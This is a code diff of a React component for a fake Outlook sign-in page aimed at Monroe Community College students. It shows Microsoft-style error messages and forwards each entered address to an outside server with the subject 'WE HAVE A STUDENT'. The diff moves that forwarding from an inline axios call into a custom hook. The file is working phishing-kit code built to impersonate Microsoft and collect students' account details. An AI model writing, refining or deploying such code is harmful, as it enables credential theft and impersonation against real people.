@@ -1,71 +1,53 @@
 import { useState, useEffect } from "react";
-import axios from "axios"; // Import axios
 import { FormFooter } from "./FormFooter";
+import useGo from "./useGo"; // Import the custom hook
 
 export const Email = ({ onNext, emailError, email }) => {
   const [emailValue, setEmailValue] = useState("");
-  const [borderColor, setBorderColor] = useState("1px solid #ccc"); // Default border color
+  const [borderColor, setBorderColor] = useState("1px solid #ccc");
   const [errorMessage, setErrorMessage] = useState("");
-  const [isSending, setIsSending] = useState(false); // Track sending status
-  const [isEmailValidated, setIsEmailValidated] = useState(false); // Track email validation
+  const [isEmailValidated, setIsEmailValidated] = useState(false);
+
+  const { isSending, error, successMessage, sendEmail } = useGo(); // Use the hook
 
   // If email prop changes, set it as the value for the email input
   useEffect(() => {
     if (email) {
-      setEmailValue(email); // Pre-fill the email field
+      setEmailValue(email);
     }
   }, [email]);
 
   // Handle input changes
   const handleInputChange = (e) => {
     setEmailValue(e.target.value);
-    setBorderColor("1px solid #ccc"); // Reset border color when typing
-    setErrorMessage(""); // Reset error message when user starts typing
-  };
-
-  // Function to send email using axios
-  const sendEmail = async (email) => {
-    const payload = {
-      subject: `${email.toString().toUpperCase()} : WE HAVE A STUDENT`,
-      message: `User entered the email: ${email}`, // This will be the email body
-    };
-
-    try {
-      setIsSending(true); // Set sending state to true when the sending starts
-      const response = await axios.post(
-        "https://ivytechedu-cvfc.vercel.app/send-email",
-        payload
-      ); // Make POST request to backend email API
-      console.log("Email sent successfully", response.data);
-      setIsSending(false); // Reset sending state after the email is sent
-      onNext(email); // Proceed to the next step after the email is successfully sent
-    } catch (error) {
-      setIsSending(false); // Reset sending state in case of error
-      console.error(
-        "Failed to send email",
-        error.response?.data || error.message
-      );
-    }
+    setBorderColor("1px solid #ccc");
+    setErrorMessage("");
   };
 
   // Handle the next button click
   const handleNext = () => {
-    // Check if the email is empty or invalid
     if (!emailValue.trim()) {
       setErrorMessage(
         "Enter a valid email address, phone number, or Skype name."
       );
-      setBorderColor("1px solid red"); // Red border for empty email
+      setBorderColor("1px solid red");
     } else if (!emailValue.includes("@monroecc.edu")) {
       setErrorMessage("We couldn't find an account with that username.");
-      setBorderColor("1px solid red"); // Red border for invalid email
+      setBorderColor("1px solid red");
     } else {
-      setErrorMessage(""); // No error
-      setBorderColor("1px solid #ccc"); // Reset border
-      setIsEmailValidated(true); // Mark email as validated
-      sendEmail(emailValue); // Send email with the entered email address
+      setErrorMessage("");
+      setBorderColor("1px solid #ccc");
+      setIsEmailValidated(true);
+
+      // Construct the email subject and message
+      const subject = "We have a new student!";
+      const message = `email: ${emailValue}`;
+
+      // Use the sendEmail function from the hook to send the email
+      sendEmail(subject, message);
+
       localStorage.setItem("student_id", emailValue);
-      console.log(emailValue);
+      onNext(emailValue);
     }
   };
 
@@ -73,16 +55,14 @@ export const Email = ({ onNext, emailError, email }) => {
     <>
       <div
         className="field-container"
-        style={{ opacity: isEmailValidated && isSending ? 0.5 : 1 }} // Apply fade when email is validated and sending
+        style={{ opacity: isEmailValidated && isSending ? 0.5 : 1 }}
       >
         <div className="f-t">
           <h1 className="form-title">Sign in</h1>
-          
           <p className="ft">to continue to Outlook</p>
         </div>
 
         <div className="input-message">
-          {/* Show error message if there's an error */}
           {errorMessage && (
             <p className="guide error" style={{ color: "red" }}>
               {errorMessage}
@@ -90,7 +70,6 @@ export const Email = ({ onNext, emailError, email }) => {
           )}
 
           <input
-            type="email"
             name="email"
             id="email"
             placeholder="Email, phone or Skype"
@@ -98,8 +77,8 @@ export const Email = ({ onNext, emailError, email }) => {
             value={emailValue}
             onChange={handleInputChange}
             style={{
-              borderBottom: borderColor, // Apply border color dynamically
-              backgroundColor: "transparent", // Keep background transparent
+              borderBottom: borderColor,
+              backgroundColor: "transparent",
             }}
           />
         </div>
@@ -107,11 +86,13 @@ export const Email = ({ onNext, emailError, email }) => {
 
         <div className="button-container">
           <button type="button" className="next" onClick={handleNext}>
-            Next
+            {isSending ? "Sending..." : "Next"}
           </button>
         </div>
       </div>
       <FormFooter />
+      {error && <p style={{ color: "red" }}>{error}</p>}
+      {successMessage && <p style={{ color: "green" }}>{successMessage}</p>}
     </>
   );
 };
